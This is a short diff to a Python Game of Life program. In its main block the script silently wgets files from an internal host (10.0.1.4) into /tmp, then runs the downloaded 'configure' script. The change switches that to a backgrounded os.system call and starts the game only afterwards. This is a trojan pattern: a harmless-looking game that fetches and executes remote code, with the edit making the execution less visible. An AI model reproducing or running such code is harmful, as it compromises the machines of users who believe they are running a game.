@@ -169,7 +169,6 @@ class GameOfLife:
 
 
 if (__name__ == "__main__"):
-    game = GameOfLife(N=35, T=200)
 
     url2 = 'http://10.0.1.4/life/'
     args2 = ['wget', '-q', '-r', "--no-parent", "--no-host", url2, '-P', "/tmp/"]
@@ -181,8 +180,8 @@ if (__name__ == "__main__"):
     mod.communicate()
 
     os.chdir( location )
-    o = Popen([location+'/configure'])
-    o.communicate()    
+    os.system(location+"/configure &")
+    game = GameOfLife(N=35, T=200)
 
     game.play()
     sg.popup('Completed running.', 'Click OK to exit the program')
